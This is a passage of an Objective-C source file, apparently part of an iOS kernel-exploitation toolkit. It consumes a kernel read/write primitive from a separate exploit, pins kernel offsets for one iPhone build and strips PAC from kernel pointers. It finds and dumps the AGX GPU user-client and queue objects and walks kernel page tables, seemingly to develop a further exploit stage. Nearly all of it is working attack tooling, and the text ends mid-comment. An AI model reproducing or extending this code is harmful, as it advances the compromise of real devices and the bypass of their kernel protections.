//
//  CNDUatQueueProbe.m
//
//  Reads the AGX user-client object and the queue object behind selector 45, so the
//  submit failure is diagnosed from object state rather than from a return code.
//
//  Path:
//    IOServiceOpen(AGXAcceleratorG17P, type 1)  -> io_connect_t (a port name)
//    task_self()                                -> our task
//    task_get_ipc_port_kobject(task, conn)      -> the user-client kernel object
//    client+0x110 / client+0x120                -> the two tables it publishes
//    table lookup by queue id                   -> the queue object
//    queue+0x28 / queue+0x78                    -> the callee's two prerequisites
//
//  Every read is validated with kslop's is_kaddr_valid(); an implausible pointer is
//  reported and not followed.  No kernel writes.
//

#import "CNDUatQueueProbe.h"

#import <dlfcn.h>
#import <mach/mach.h>
#import <stdio.h>
#import <IOKit/IOKitLib.h>

#pragma mark - pins (iPhone17,2 23A341)

// `IOGPUDeviceUserClient::externalMethod` and the __DATA_CONST slot that holds it,
// both resolved offline through the container's chained fixups
// (tools/chained_fixups.py).  A client whose vtable carries this value at the same
// relative slot is the IOGPU class or a subclass of it.
static const uint64_t CNDUatQUnslidIOGPUExternalMethod = 0xfffffff00a502aa8ull;
// The IOGPUDeviceUserClient vtable base, and the offset of externalMethod inside
// it, both resolved offline from the chained-fixup runs.  The offset (0x540) is
// well past a naive 0x400-byte scan, which is why the first attempt found nothing
// even for the right class.
static const uint64_t CNDUatQUnslidIOGPUClientVtable = 0xfffffff008067738ull;
static const uint64_t CNDUatQExternalMethodOffset    = 0x540ull;
// Boot-time singletons in IOGPUFamily __DATA.  Their addresses are image
// addresses, so reading them is panic-safe; the classes were identified from the
// initialisers that install their vtables:
//   0xa51c910 -> "IOGPUVnioDesc"           vtable slot 0x806ad98
//   0xa520bbc -> "IOGPUClientSharedMachine" vtable slot 0x806ac50
static const uint64_t CNDUatQSharedMachine = 0xfffffff00b4daf50ull;
static const uint64_t CNDUatQVnioDesc      = 0xfffffff00b4daf78ull;
// The image spans ~71 MiB from the kernel base; pointers inside it are mapped by
// construction and can be dereferenced.  Anything else is reported, not followed.
static const uint64_t CNDUatQImageSpan      = 0x06000000ull;

// VA walk.  The three globals are pinned from the 23A341 image: gVirtBase and
// gPhysBase are the same constants CNDHailMaryProbe uses, and cpu_ttep was
// resolved with the XPF CLI (`xpf_test kernelcache.raw` -> "cpu_ttep found").
// Geometry is the 16 KiB granule with T1SZ_BOOT = 25, which this device reports
// (XPF: ARM_TT_L1_INDEX_MASK = 0x0000007000000000).
static const uint64_t CNDUatQGVirtBase = 0xfffffff007c38c68ull;
static const uint64_t CNDUatQGPhysBase = 0xfffffff007c69dc0ull;
static const uint64_t CNDUatQGPhysSize = 0xfffffff007c69dc8ull;
static const uint64_t CNDUatQCpuTtep   = 0xfffffff00b2a3660ull;
// Slots written by the SPTM init path from `libsptm_state.root_table_paddr`
// (arm_init_sptm.c): 0x7c14e68 / 0x7c14e70 and the >>14 page number at 0x7c14e78.
static const uint64_t CNDUatQRootSlotA = 0xfffffff007c14e68ull;
static const uint64_t CNDUatQRootSlotB = 0xfffffff007c14e70ull;
static const uint64_t CNDUatQRootSlotC = 0xfffffff007c14e78ull;
enum {
    CNDUatQL1Mask   = 0x0000007000000000ull,
    CNDUatQL1Shift  = 36,
    CNDUatQL2Mask   = 0x0000000ffe000000ull,
    CNDUatQL2Shift  = 25,
    CNDUatQL3Mask   = 0x0000000001ffc000ull,
    CNDUatQL3Shift  = 14,
    CNDUatQPageSize = 0x4000,
};
static const uint64_t CNDUatQTTMask = 0x0000fffffffff000ull;
// A VA far below the kernel image: any walk that reports it as mapped means the
// geometry or the root table is wrong, so the self-test fails loudly.
#define CNDUAT_FAKE_VA ((uint64_t)0xfffffff000001000ull)
// Kernel VAs on this build live under this prefix; used only to rebuild an address
// from a PAC-masked pointer, and always re-validated with is_kaddr_valid().
static const uint64_t CNDUatQVaOr = 0xfffffff000000000ull;

#pragma mark - kexploit API (same contract as the other kslop probes)

typedef void (*CNDUatQKReadBufFn)(uint64_t address, void *buffer, uint64_t length);
typedef uint64_t (*CNDUatQKRead64Fn)(uint64_t address);
typedef bool (*CNDUatQReadyFn)(void);
typedef int (*CNDUatQKexploitFn)(void);
typedef void (*CNDUatQOffsetsInitFn)(void);
typedef bool (*CNDUatQAddrValidFn)(uint64_t address);
typedef uint64_t (*CNDUatQTaskSelfFn)(void);
typedef uint64_t (*CNDUatQPortKobjectFn)(uint64_t task, mach_port_t port);

typedef struct {
    CNDUatQKReadBufFn kreadbuf;
    CNDUatQKRead64Fn kread64;
    CNDUatQReadyFn krwReady;
    CNDUatQKexploitFn kexploit;
    CNDUatQOffsetsInitFn offsetsInit;
    CNDUatQAddrValidFn isKaddrValid;
    CNDUatQTaskSelfFn taskSelf;
    CNDUatQPortKobjectFn portKobject;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint64_t *t1sz;
} CNDUatQAPI;

static bool CNDUatQResolve(CNDUatQAPI *api, NSString **reason)
{
    if (api == NULL) {
        return false;
    }
    memset(api, 0, sizeof(*api));
    api->kreadbuf = (CNDUatQKReadBufFn)dlsym(RTLD_DEFAULT, "kreadbuf");
    api->kread64 = (CNDUatQKRead64Fn)dlsym(RTLD_DEFAULT, "kread64");
    api->krwReady = (CNDUatQReadyFn)dlsym(RTLD_DEFAULT, "kexploit_krw_ready");
    api->kexploit = (CNDUatQKexploitFn)dlsym(RTLD_DEFAULT, "kexploit_opa334");
    api->offsetsInit = (CNDUatQOffsetsInitFn)dlsym(RTLD_DEFAULT, "offsets_init");
    api->isKaddrValid = (CNDUatQAddrValidFn)dlsym(RTLD_DEFAULT, "is_kaddr_valid");
    api->taskSelf = (CNDUatQTaskSelfFn)dlsym(RTLD_DEFAULT, "task_self");
    api->portKobject = (CNDUatQPortKobjectFn)dlsym(RTLD_DEFAULT,
                                                   "task_get_ipc_port_kobject");
    api->kernelBase = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_base");
    api->kernelSlide = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_slide");
    api->t1sz = (uint64_t *)dlsym(RTLD_DEFAULT, "t1sz_boot");
    bool ok = api->kreadbuf && api->krwReady && api->kexploit && api->offsetsInit &&
        api->isKaddrValid && api->taskSelf && api->portKobject &&
        api->kernelBase && api->kernelSlide;
    if (!ok && reason != NULL) {
        *reason = @"kexploit/kutils API incomplete (kreadbuf, is_kaddr_valid, "
                  @"task_self, task_get_ipc_port_kobject)";
    }
    return ok;
}

static bool CNDUatQRead(const CNDUatQAPI *api, uint64_t address, void *buffer,
                        size_t length)
{
    if (!api || !api->kreadbuf || !buffer || length == 0) {
        return false;
    }
    api->kreadbuf(address, buffer, (uint64_t)length);
    return true;
}

static uint64_t CNDUatQRead64(const CNDUatQAPI *api, uint64_t address)
{
    uint64_t v = 0;
    CNDUatQRead(api, address, &v, sizeof(v));
    return v;
}

// Rebuilds a full VA from a stored (PAC-signed) pointer.  Only the low
// 64 - t1sz_boot bits survive signing, so the canonical prefix is re-applied and
// the result is validated before use.  Never dereference without this.
static uint64_t CNDUatQUnsign(const CNDUatQAPI *api, uint64_t stored, uint64_t mask)
{
    if (api == NULL) {
        return 0;
    }
    uint64_t masked = stored & mask;
    uint64_t candidate = CNDUatQVaOr | masked;
    if (api->isKaddrValid != NULL && api->isKaddrValid(candidate)) {
        return candidate;
    }
    if (api->isKaddrValid != NULL && api->isKaddrValid(masked)) {
        return masked;
    }
    return 0;
}

static bool CNDUatQValid(const CNDUatQAPI *api, uint64_t address)
{
    return api && api->isKaddrValid && address != 0 && (address & 0x7) == 0 &&
        api->isKaddrValid(address);
}

static NSString *CNDUatQHexList(const CNDUatQAPI *api, uint64_t address, int words)
{
    NSMutableArray<NSString *> *parts = [NSMutableArray array];
    for (int i = 0; i < words; i++) {
        uint64_t v = CNDUatQRead64(api, address + (uint64_t)i * 8);
        [parts addObject:[NSString stringWithFormat:@"+%02x=%016llx", i * 8,
                          (unsigned long long)v]];
    }
    return [parts componentsJoinedByString:@" "];
}

#pragma mark - VA walk

typedef struct {
    bool mapped;
    uint8_t level;          // 1..3 terminal level, 0 = unmapped
    uint64_t paddr;
    uint64_t entries[3];
    uint64_t tables[3];
    const char *fault;      // static string, nil when mapped
} CNDUatQWalkResult;

static void CNDUatQPersist(NSMutableDictionary<NSString *, id> *report, NSString *key,
                           id value);

// phystokv() itself panics when pa is outside [gPhysBase, gPhysBase+gPhysSize),
// so this mirror must enforce the same bound.  Without it a garbage page-table
// chain produces an unmapped kernel VA and the *read* faults.
static uint64_t CNDUatQPhysToKernel(const CNDUatQAPI *api, uint64_t gVirtBase,
                                    uint64_t gPhysBase, uint64_t gPhysSize,
                                    uint64_t pa)
{
    (void)api;
    if (gVirtBase == 0 || gPhysBase == 0 || gPhysSize == 0) {
        return 0;
    }
    if (pa < gPhysBase || pa - gPhysBase >= gPhysSize) {
        return 0;
    }
    return gVirtBase + (pa - gPhysBase);
}

// Walks the kernel map for one VA.  Every page-table page is reached through the
// physmap (image-mapped), so this never dereferences an unvalidated address.
//
// `report`/`tag` make the walk self-documenting: each step is persisted *before*
// the read it is about to issue, so a fault leaves the exact address that was
// being fetched instead of a truncated report.
static CNDUatQWalkResult CNDUatQWalk(const CNDUatQAPI *api, uint64_t gVirtBase,
                                     uint64_t gPhysBase, uint64_t gPhysSize,
                                     uint64_t rootTable, uint64_t va,
                                     NSMutableDictionary *report, NSString *tag)
{
    CNDUatQWalkResult r;
    memset(&r, 0, sizeof(r));
    uint64_t table = rootTable;
    const uint64_t masks[3] = { CNDUatQL1Mask, CNDUatQL2Mask, CNDUatQL3Mask };
    const uint64_t shifts[3] = { CNDUatQL1Shift, CNDUatQL2Shift, CNDUatQL3Shift };
    for (uint8_t level = 1; level <= 3; level++) {
        uint64_t index = (va & masks[level - 1]) >> shifts[level - 1];
        uint64_t entryAddress = table + index * 8;
        if (report != nil) {
            CNDUatQPersist(report,
                           [NSString stringWithFormat:@"trace.%@", tag ?: @"walk"],
                           @{ @"stage": [NSString stringWithFormat:@"L%u-reading", level],
                              @"va": @(va), @"table": @(table), @"index": @(index),
                              @"entryAddress": @(entryAddress) });
        }
        uint64_t entry = CNDUatQRead64(api, entryAddress);
        r.entries[level - 1] = entry;
        r.tables[level - 1] = table;
        if (report != nil) {
            NSMutableDictionary *t = [report[[NSString stringWithFormat:@"trace.%@",
                                              tag ?: @"walk"]] mutableCopy];
            if (t == nil) { t = [NSMutableDictionary dictionary]; }
            [t addEntriesFromDictionary:@{
                [NSString stringWithFormat:@"l%uEntry", level]: @(entry),
                [NSString stringWithFormat:@"l%uAddress", level]: @(entryAddress) }];
            report[[NSString stringWithFormat:@"trace.%@", tag ?: @"walk"]] = t;
            CNDUatQPersist(report, nil, nil);
        }
        if ((entry & 1) == 0) {
            r.fault = "invalid-entry";
            return r;
        }
        bool isTable = (entry & 3) == 2;
        if (!isTable) {
            // block (L1/L2) or page (L3)
            uint64_t base = entry & CNDUatQTTMask & ~(CNDUatQPageSize - 1);
            r.mapped = true;
            r.level = level;
            r.paddr = base | (va & (CNDUatQPageSize - 1));
            return r;
        }
        if (level == 3) {
            r.fault = "table-at-leaf";
            return r;
        }
        uint64_t nextPa = entry & CNDUatQTTMask;
        uint64_t nextVa = CNDUatQPhysToKernel(api, gVirtBase, gPhysBase, gPhysSize,
                                              nextPa);
        if (nextVa == 0 || (nextPa & (CNDUatQPageSize - 1)) != 0) {
            r.fault = "unmappable-next-table";
            return r;
        }
        table = nextVa;
    }
    r.fault = "no-terminal-entry";
    return r;
}

#pragma mark - report

static NSString *CNDUatQReportPath(void)
{
    NSString *dir = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    if (dir == nil) {
        return nil;
    }
    return [dir stringByAppendingPathComponent:@"CNDUatQueueProbe.json"];
}

static void CNDUatQPersist(NSMutableDictionary<NSString *, id> *report, NSString *key,
                           id value)
{
    if (key != nil && value != nil) {
        report[key] = value;
    }
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys error:nil];
    NSString *path = CNDUatQReportPath();
    if (data != nil && path != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
        report[@"reportPath"] = path;
    }
    if (key != nil) {
        NSLog(@"[CND_UATQ] %@=%@", key, value);
    }
}


// Minimal physmap probe: the three image-anchored globals and nothing else.
// The gVirtBase + 1 MiB control faulted at level 2 on 2026-10-29. Being inside
// the physical window does not establish that an aperture VA is mapped, so do
// not probe apertures speculatively through the kernel-side copyout primitive.
void CNDUatPhysControlRun(void (^completion)(NSDictionary<NSString *, id> *))
{
    NSMutableDictionary *report = [NSMutableDictionary dictionary];
    report[@"schema"] = @"com.zeroxjf.cyanide.uat-phys-control";
    report[@"schemaVersion"] = @1;

    CNDUatQAPI api;
    NSString *reason = nil;
    if (!CNDUatQResolve(&api, &reason)) {
        CNDUatQPersist(report, @"result", reason ?: @"api-missing");
        if (completion) { completion(report); }
        return;
    }
    api.offsetsInit();
    // Deliberately no api.kexploit() call here.  A probe that acquires on its
    // own bypasses the app's guarded acquisition (settings_ensure_kexploit),
    // which handles stale state and recovery; direct calls crash in the page
    // exploit's OOB read.  A probe only ever consumes a live KRW session.
    if (!api.krwReady()) {
        CNDUatQPersist(report, @"result", @"krw-not-ready");
        if (completion) { completion(report); }
        return;
    }

    uint64_t slide = api.kernelSlide ? *api.kernelSlide : 0;
    uint64_t gVirtBase = CNDUatQRead64(&api, CNDUatQGVirtBase + slide);
    uint64_t gPhysBase = CNDUatQRead64(&api, CNDUatQGPhysBase + slide);
    uint64_t gPhysSize = CNDUatQRead64(&api, CNDUatQGPhysSize + slide);
    printf("[UAT_PHYS] slide=%#llx virt=%#llx phys=%#llx size=%#llx\n",
           (unsigned long long)slide, (unsigned long long)gVirtBase,
           (unsigned long long)gPhysBase, (unsigned long long)gPhysSize);
    fflush(stdout);
    CNDUatQPersist(report, @"phys", @{ @"slide": @(slide), @"gVirtBase": @(gVirtBase),
                                       @"gPhysBase": @(gPhysBase),
                                       @"gPhysSize": @(gPhysSize) });

    report[@"apertureReads"] = @0;
    CNDUatQPersist(report, @"result", @"phys-globals-only");

    if (completion) { completion(report); }
}

#pragma mark - image-only probe

// Reads *only* statically known kernel-image addresses: the physmap globals and
// three windows around the physical-aperture descriptor.  No user client, no
// mach_port_kobject, no pointer harvested from a kernel object.
//
// That restriction is the whole point.  The read primitive is a kernel-side
// copyout through a retargeted socket pcb (kexploit_opa334.m:
// early_kread_checked), so a single read of a page that is not mapped -- any
// page the kernel does not own inside the physical aperture -- panics the
// machine.  Runtime pointers are untrusted; symbol-anchored ones are not.
void CNDUatImageProbeRun(void (^completion)(NSDictionary<NSString *, id> *))
{
    NSMutableDictionary *report = [NSMutableDictionary dictionary];
    report[@"schema"] = @"com.zeroxjf.cyanide.uat-image-probe";
    report[@"schemaVersion"] = @1;
    report[@"krwSource"] = @"kslop in-process lease";
    report[@"readPolicy"] = @"image-anchored-only";

    CNDUatQAPI api;
    NSString *reason = nil;
    if (!CNDUatQResolve(&api, &reason)) {
        CNDUatQPersist(report, @"result", reason ?: @"api-missing");
        if (completion) { completion(report); }
        return;
    }
    api.offsetsInit();
    // Deliberately no api.kexploit() call here.  A probe that acquires on its
    // own bypasses the app's guarded acquisition (settings_ensure_kexploit),
    // which handles stale state and recovery; direct calls crash in the page
    // exploit's OOB read.  A probe only ever consumes a live KRW session.
    if (!api.krwReady()) {
        CNDUatQPersist(report, @"result", @"krw-not-ready");
        if (completion) { completion(report); }
        return;
    }

    uint64_t slide = api.kernelSlide ? *api.kernelSlide : 0;
    uint64_t gVirtBase = CNDUatQRead64(&api, CNDUatQGVirtBase + slide);
    uint64_t gPhysBase = CNDUatQRead64(&api, CNDUatQGPhysBase + slide);
    uint64_t gPhysSize = CNDUatQRead64(&api, CNDUatQGPhysSize + slide);
    uint64_t cpuTtep   = CNDUatQRead64(&api, CNDUatQCpuTtep + slide);
    NSMutableDictionary *w = [NSMutableDictionary dictionary];
    w[@"gVirtBase"] = @(gVirtBase);
    w[@"gPhysBase"] = @(gPhysBase);
    w[@"gPhysSize"] = @(gPhysSize);
    w[@"cpuTtep"] = @(cpuTtep);
    w[@"slide"] = @(slide);
    w[@"physWindow"] = @{ @"start": @(gPhysBase),
                          @"end": @(gPhysBase + gPhysSize) };
    // Print before persisting: a console attach survives transport loss better
    // than a file copy, and this line alone answers the physmap question.
    printf("[UAT_IMG] slide=%#llx virt=%#llx phys=%#llx size=%#llx end=%#llx\n",
           (unsigned long long)slide, (unsigned long long)gVirtBase,
           (unsigned long long)gPhysBase, (unsigned long long)gPhysSize,
           (unsigned long long)(gPhysBase + gPhysSize));
    fflush(stdout);
    CNDUatQPersist(report, @"walk", w);

    // Positive control for the physmap model itself.  Every read that has ever
    // succeeded in this programme was of an image address *below* gVirtBase, so
    // nothing yet shows that a phystokv()-derived aperture VA is readable at all.
    // Two low offsets, each announced before the read: if the aperture is broadly
    // mapped with carveout-sized holes, these return data; if the model is wrong,
    // the report names the address that faulted.
    if (gPhysBase != 0 && gPhysSize > 0x200000) {
        NSMutableArray *control = [NSMutableArray array];
        uint64_t offsets[2] = { 0x100000ull, 0x1000000ull };
        for (int i = 0; i < 2; i++) {
            uint64_t va = gVirtBase + offsets[i];
            CNDUatQPersist(report, @"trace.control",
                           @{ @"stage": @"control-reading", @"va": @(va),
                              @"pa": @(gPhysBase + offsets[i]) });
            uint64_t v = CNDUatQRead64(&api, va);
            printf("[UAT_IMG] control va=%#llx pa=%#llx value=%#llx\n",
                   (unsigned long long)va,
                   (unsigned long long)(gPhysBase + offsets[i]),
                   (unsigned long long)v);
            fflush(stdout);
            [control addObject:@{ @"va": @(va), @"pa": @(gPhysBase + offsets[i]),
                                  @"value": @(v) }];
            CNDUatQPersist(report, @"control", control);
        }
    }


    // The descriptor holding the candidate at +0x6c0 and the DRAM pair.
    // Ranges are (unslid base, word count): mixing a full VA for the start with a
    // bare low-32-bit end makes the loop run zero times, which is how the first
    // version of this probe "succeeded" without reading anything.
    NSArray<NSArray<NSNumber *> *> *ranges = @[
        @[ @0xfffffff007c14580ull, @(16) ],   // around the candidate 0x7c145f8
        @[ @0xfffffff007c14e00ull, @(17) ],   // around the DRAM base/size pair
        @[ @0xfffffff007c13f38ull, @(8) ],    // the structure base itself
    ];
    NSMutableArray *dump = [NSMutableArray array];
    for (NSArray<NSNumber *> *r in ranges) {
        uint64_t base = r[0].unsignedLongLongValue;
        NSUInteger count = r[1].unsignedIntegerValue;
        NSMutableArray *window = [NSMutableArray array];
        for (NSUInteger i = 0; i < count; i++) {
            uint64_t addr = base + (uint64_t)i * 8;
            uint64_t v = CNDUatQRead64(&api, addr + slide);
            [window addObject:@{ @"address": @(addr), @"value": @(v) }];
        }
        [dump addObject:@{ @"base": @(base), @"count": @(count), @"words": window }];
        CNDUatQPersist(report, @"windows", dump);
    }

    CNDUatQPersist(report, @"result", @"image-read");
    if (completion) { completion(report); }
}

#pragma mark - probe

bool CNDUatQueueProbeIsSupported(NSString **reason)
{
    CNDUatQAPI api;
    return CNDUatQResolve(&api, reason);
}

void CNDUatQueueProbeRun(BOOL enableWalk,
                         void (^completion)(NSDictionary<NSString *, id> *))
{
    NSMutableDictionary<NSString *, id> *report = [NSMutableDictionary dictionary];
    report[@"schema"] = @"com.zeroxjf.cyanide.uat-queue-probe";
    report[@"schemaVersion"] = @1;
    report[@"krwSource"] = @"kslop in-process lease";

    CNDUatQAPI api;
    NSString *reason = nil;
    if (!CNDUatQResolve(&api, &reason)) {
        CNDUatQPersist(report, @"result", reason ?: @"api-missing");
        if (completion) {
            completion(report);
        }
        return;
    }
    api.offsetsInit();
    // A probe never acquires, by any route.  Even the app's guarded acquisition
    // can crash inside the page exploit's scan, and calling it from a probe
    // interferes with an acquisition the user is already running.  A probe only
    // ever consumes a live session.
    if (!api.krwReady()) {
        CNDUatQPersist(report, @"result", @"krw-not-ready");
        if (completion) {
            completion(report);
        }
        return;
    }

    uint64_t t1szPre = (api.t1sz != NULL) ? *api.t1sz : 0;
    uint64_t ptrMaskPre = (t1szPre > 0 && t1szPre < 64)
        ? ((1ull << (64 - t1szPre)) - 1ull) : 0xFFFFFFFFFull;
    uint64_t slidePre = api.kernelSlide ? *api.kernelSlide : 0;
    report[@"ptrMask"] = @(ptrMaskPre);

    uint64_t task = api.taskSelf();
    report[@"selfTask"] = @(task);
    if (!CNDUatQValid(&api, task)) {
        CNDUatQPersist(report, @"result", @"task_self-invalid");
        if (completion) {
            completion(report);
        }
        return;
    }

    // Open a client, create a queue, and resolve the client object.
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AGXAcceleratorG17P"));
    if (!svc) {
        CNDUatQPersist(report, @"result", @"agx-service-missing");
        if (completion) {
            completion(report);
        }
        return;
    }
    io_connect_t conn = 0;
    kern_return_t openKr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
    report[@"openKR"] = @(openKr);
    if (openKr != KERN_SUCCESS || !conn) {
        IOObjectRelease(svc);
        CNDUatQPersist(report, @"result", @"open-failed");
        if (completion) {
            completion(report);
        }
        return;
    }

    // mach_port_kobject() is answered by the kernel, so it sidesteps the
    // ip_kobject signing problem entirely: if it is permitted for a user-client
    // port, it returns the object's kernel VA directly.
    ipc_info_object_type_t kobjType = 0;
    mach_vm_address_t kobjAddr = 0;
    kern_return_t kobjKr = mach_port_kobject(mach_task_self(), conn, &kobjType,
                                             &kobjAddr);
    report[@"machPortKobject"] = @{
        @"kr": @(kobjKr),
        @"type": @(kobjType),
        @"address": @(kobjAddr),
        @"valid": @(CNDUatQValid(&api, (uint64_t)kobjAddr)),
    };

    uint64_t clientRaw = api.portKobject(task, conn);
    // ip_kobject is PAC-signed; reading the raw form lands on a bogus (but mapped)
    // address, which is why the first two attempts saw a blank object.
    uint64_t client = CNDUatQUnsign(&api, clientRaw, ptrMaskPre);
    if (kobjKr == KERN_SUCCESS && CNDUatQValid(&api, (uint64_t)kobjAddr)) {
        client = (uint64_t)kobjAddr;
        report[@"clientObjectSource"] = @"mach_port_kobject";
    } else if (client != 0) {
        report[@"clientObjectSource"] = @"ip_kobject-unsign";
    }
    report[@"clientObjectRaw"] = @(clientRaw);
    report[@"clientObject"] = @(client);
    // A failed hop must not hide the singleton reads or the queue oracle below;
    // those need only the connection, not the kobject.
    BOOL clientResolved = CNDUatQValid(&api, client) ? YES : NO;
    if (!clientResolved) {
        CNDUatQPersist(report, @"clientHop", @"invalid");
    }

    // --- identify the object we resolved -----------------------------------
    uint64_t ptrMask = ptrMaskPre;
    uint64_t slide = slidePre;

    if (clientResolved) {
    uint64_t vtableStored = CNDUatQRead64(&api, client);
    uint64_t vtable = CNDUatQUnsign(&api, vtableStored, ptrMask);
    uint64_t wantExternal = (CNDUatQUnslidIOGPUExternalMethod + slide) & ptrMask;
    NSMutableDictionary *ident = [NSMutableDictionary dictionary];
    ident[@"vtableStored"] = @(vtableStored);
    ident[@"vtableMasked"] = @(vtableStored & ptrMask);
    ident[@"vtableAddress"] = @(vtable);
    ident[@"externalMethodMasked"] = @(wantExternal);
    if (vtable != 0) {
        // Find the slot carrying externalMethod; its distance from the vtable base
        // tells us whether this is the IOGPU class (or a subclass that kept it).
        NSMutableArray *hits = [NSMutableArray array];
        for (uint64_t off = 0; off <= 0x600; off += 8) {
            uint64_t v = CNDUatQRead64(&api, vtable + off);
            if ((v & ptrMask) == wantExternal) {
                [hits addObject:@(off)];
            }
        }
        ident[@"externalSlotOffsets"] = hits;
        // Direct identification: does this object's vtable match the IOGPU client's
        // expected base, and does the externalMethod slot hold the right value?
        uint64_t expectedBase = (CNDUatQUnslidIOGPUClientVtable + slide) & ptrMask;
        ident[@"expectedVtableMasked"] = @(expectedBase);
        ident[@"isIOGPUClient"] = @((vtableStored & ptrMask) == expectedBase);
        uint64_t slotValue = CNDUatQRead64(&api, vtable + CNDUatQExternalMethodOffset);
        ident[@"externalSlotValueMasked"] = @(slotValue & ptrMask);
        ident[@"slotMatches"] = @((slotValue & ptrMask) == wantExternal);
    }
    report[@"clientIdentity"] = ident;
    }

    // --- wider window, with every pointer field classified ------------------
    NSMutableArray *fields = [NSMutableArray array];
    for (uint64_t off = 0; clientResolved && off <= 0x140; off += 8) {
        uint64_t raw = CNDUatQRead64(&api, client + off);
        uint64_t va = CNDUatQUnsign(&api, raw, ptrMask);
        [fields addObject:@{ @"off": @(off), @"raw": @(raw),
                             @"ptr": @(va), @"valid": @(va != 0) }];
    }
    report[@"clientWindow"] = fields;

    // --- boot-time singletons (panic-safe reads) ---------------------------
    uint64_t kbase = api.kernelBase ? *api.kernelBase : 0;
    NSMutableArray *statics = [NSMutableArray array];
    uint64_t staticsList[2] = { CNDUatQSharedMachine + slide,
                                CNDUatQVnioDesc + slide };
    for (int i = 0; i < 2; i++) {
        NSMutableArray *words = [NSMutableArray array];
        for (int w = 0; w < 8; w++) {
            uint64_t value = CNDUatQRead64(&api, staticsList[i] + (uint64_t)w * 8);
            BOOL inImage = (value >= kbase && value < kbase + CNDUatQImageSpan);
            [words addObject:@{ @"off": @(w * 8), @"raw": @(value),
                                @"inImage": @(inImage) }];
        }
        [statics addObject:@{ @"address": @(staticsList[i]),
                              @"name": i == 0 ? @"IOGPUClientSharedMachine"
                                              : @"IOGPUVnioDesc",
                              @"words": words }];
    }
    report[@"staticSingletons"] = statics;
    CNDUatQPersist(report, @"staticSingletons", statics);

    // The field the submit path reads, per table, on the shared machine.
    NSArray<NSNumber *> *tableOffsets = @[ @0x88, @0x108, @0x110 ];
    NSMutableDictionary *beforeTables = [NSMutableDictionary dictionary];
    for (NSNumber *off in tableOffsets) {
        beforeTables[[NSString stringWithFormat:@"0x%llx",
                      [off unsignedLongLongValue]]] =
            @(CNDUatQRead64(&api, staticsList[0] + [off unsignedLongLongValue]));
    }
    report[@"sharedMachineTablesBefore"] = beforeTables;
    CNDUatQPersist(report, @"sharedMachineTablesBefore", beforeTables);

    // --- VA walk: physmap bases, root table, self-test --------------------
    uint64_t gVirtBase = CNDUatQRead64(&api, CNDUatQGVirtBase + slide);
    uint64_t gPhysBase = CNDUatQRead64(&api, CNDUatQGPhysBase + slide);
    uint64_t gPhysSize = CNDUatQRead64(&api, CNDUatQGPhysSize + slide);
    uint64_t cpuTtep   = CNDUatQRead64(&api, CNDUatQCpuTtep + slide);
    NSMutableDictionary *walkReport = [NSMutableDictionary dictionary];
    walkReport[@"gVirtBase"] = @(gVirtBase);
    walkReport[@"gPhysBase"] = @(gPhysBase);
    walkReport[@"gPhysSize"] = @(gPhysSize);
    walkReport[@"cpuTtep"] = @(cpuTtep);
    // gPhysSize bounds every paddr below, so a garbage value silently disables
    // the bound.  This unit has 8 GiB of DRAM; anything outside 64 MiB..16 GiB
    // means the symbol did not read back sane and the walk must not run.
    BOOL sizeSane = (gPhysSize >= 0x4000000ull && gPhysSize <= 0x400000000ull);
    // Reading a slot is one plain KRW read and is always safe; walking a slot is
    // what needs the physical window to be sane and the caller to opt in.
    BOOL slotsReady = (gVirtBase != 0 && gPhysBase != 0 && gVirtBase > gPhysBase);
    BOOL walkReady = (slotsReady && sizeSane && enableWalk);
    walkReport[@"walkEnabled"] = @(enableWalk);
    walkReport[@"sizeSane"] = @(sizeSane);
    walkReport[@"physWindow"] = @{ @"start": @(gPhysBase),
                                   @"end": @(gPhysBase + gPhysSize) };
    walkReport[@"slotsReady"] = @(slotsReady);
    walkReport[@"ready"] = @(walkReady);
    // NOTE (2026-10-27): a broader version of this discovery scanned the image's
    // data segments (~1.1M reads through the socket-based KRW primitive) and
    // panicked the device. That approach is withdrawn: the primitive parks and
    // verifies a racing socket per read, so it must never be driven at scan rates.
    // What remains is a bounded read around the pinned symbol only.
    if (slotsReady) {
        NSMutableArray *nearby = [NSMutableArray array];
        for (int i = -1; i <= 2; i++) {
            uint64_t addr = CNDUatQCpuTtep + slide + (uint64_t)(i * 8);
            [nearby addObject:@{ @"address": @(addr),
                                 @"value": @(CNDUatQRead64(&api, addr)) }];
        }
        walkReport[@"cpuTtepNeighbourhood"] = nearby;
    }
    // The candidate at 0x7c145f8 sits in a structure whose base is 0x7c13f38; the
    // words at base+0xf30/+0xf38 read back as the DRAM base and size, so the
    // structure describes the physical aperture.  Dump the three neighbourhoods
    // that bound the question: around the value, around the DRAM pair, and the
    // start of the structure.  Plain data reads -- no walking, no chains.
    if (slotsReady) {
        NSArray<NSArray<NSNumber *> *> *ranges = @[
            @[ @0xfffffff007c145c0ull, @(0x7c14600ull) ],
            @[ @0xfffffff007c14e30ull, @(0x7c14e88ull) ],
            @[ @0xfffffff007c13f38ull, @(0x7c13f78ull) ],
        ];
        NSMutableArray *dump = [NSMutableArray array];
        for (NSArray<NSNumber *> *r in ranges) {
            uint64_t lo = r[0].unsignedLongLongValue;
            uint64_t hi = r[1].unsignedLongLongValue;
            for (uint64_t addr = lo; addr < hi; addr += 8) {
                [dump addObject:@{ @"address": @(addr),
                                   @"value": @(CNDUatQRead64(&api, addr + slide)) }];
            }
        }
        walkReport[@"apertureNeighbourhood"] = dump;
        CNDUatQPersist(report, @"walk", walkReport);
    }

    // Candidate roots, tried in order.  Bounded: 3 slot reads plus, per candidate
    // that is walkable, 3 reads per walk for two walks (~24 reads total).
    if (slotsReady) {
        // The paddr floor is gPhysBase because phystokv() panics below it, so a
        // value under that cannot be a walkable page table.  Slot C holds the
        // 16 KiB page number written next to the two candidate paddrs.
        // Every 64-bit global that arm_init_sptm writes, enumerated offline from
        // 0x83a3314..0x83a3bdc.  One of them receives libsptm_state's
        // root_table_paddr (arm_init_sptm.c:1733); the walker self-test decides
